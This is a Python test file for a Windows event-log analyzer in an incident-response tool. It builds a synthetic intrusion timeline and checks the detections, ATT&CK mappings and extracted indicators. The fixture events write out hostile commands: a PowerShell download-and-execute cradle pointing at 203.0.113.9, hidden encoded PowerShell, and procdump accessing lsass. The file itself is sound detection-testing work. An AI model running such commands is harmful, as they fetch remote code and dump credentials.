from datetime import datetime, timedelta, timezone

import pytest

from irsys import eventlog

NS = "http://schemas.microsoft.com/win/2004/08/events/event"
T0 = datetime(2026, 10, 5, 15, 0, tzinfo=timezone.utc)


def event(eid, minutes, channel="Security", **data):
    ts = (T0 + timedelta(minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%S.1234567Z")
    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="{NS}"><System><Provider Name="p"/><EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{ts}"/><Channel>{channel}</Channel><Computer>WS01.corp.example</Computer>'
            f'</System><EventData>{fields}</EventData></Event>')


def scenario() -> str:
    ev = []
    users = ["admin", "administrator", "user1", "kim", "lee", "park"]
    for i in range(12):
        ev.append(event(4625, i * 0.3, IpAddress="198.51.100.7", TargetUserName=users[i % 6]))
    ev.append(event(4624, 5, IpAddress="198.51.100.7", TargetUserName="kim", LogonType="10"))
    ev.append(event(4688, 7, NewProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    ParentProcessName=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    CommandLine="powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="))
    ev.append(event(7045, 9, channel="System", ServiceName="WinUpdSvc",
                    ImagePath=r"cmd.exe /c C:\Users\Public\svc.exe"))
    ev.append(event(4732, 10, TargetUserName="Administrators", MemberName="CN=kim"))
    ev.append(event(22, 11, channel="Microsoft-Windows-Sysmon/Operational", QueryName="evil-c2.example"))
    ev.append(event(10, 12, channel="Microsoft-Windows-Sysmon/Operational",
                    SourceImage=r"C:\Users\Public\procdump64.exe", TargetImage=r"C:\Windows\System32\lsass.exe",
                    GrantedAccess="0x1fffff"))
    ev.append(event(4104, 13, channel="Microsoft-Windows-PowerShell/Operational",
                    ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')"))
    ev.append(event(1102, 20, SubjectUserName="kim"))
    ev.append(event(4624, 21, IpAddress="-", TargetUserName="WS01$", LogonType="5"))  # 무시 대상
    return "\n".join(ev)


def test_eventlog_scenario(tmp_path):
    p = tmp_path / "security.xml"
    p.write_text(scenario(), encoding="utf-8")
    r = eventlog.analyze(p)
    assert r["events"] == 21
    assert r["computers"] == ["WS01.corp.example"]
    types = [f["type"] for f in r["findings"]]
    for t in ("bruteforce", "password_spray", "bruteforce_success", "external_rdp", "office_spawns_shell",
              "suspicious_command", "service_installed", "group_member_added", "lsass_access",
              "powershell_scriptblock", "log_cleared"):
        assert t in types, t
    svc = next(f for f in r["findings"] if f["type"] == "service_installed")
    assert svc["severity"] == "high"
    assert {"T1110.001", "T1110.003", "T1110", "T1021.001", "T1204.002", "T1543.003", "T1098", "T1003.001",
            "T1070.001", "T1059.001"} <= set(r["attack_techniques"])
    assert "198.51.100.7" in r["iocs"]["ipv4"]
    assert "evil-c2.example" in r["iocs"]["domain"]
    assert "http://203.0.113.9/a" in r["iocs"]["url"]
    assert r["logons"] == [{"user": "kim", "ip": "198.51.100.7", "type": "원격 대화형(RDP)", "count": 1}]
    assert r["start"] == "2026-10-05T15:00:00.123456+00:00"


def test_rejects_dtd(tmp_path):
    p = tmp_path / "x.xml"
    p.write_text('<!DOCTYPE x [<!ENTITY a "b">]><Event/>')
    with pytest.raises(ValueError):
        eventlog.analyze(p)
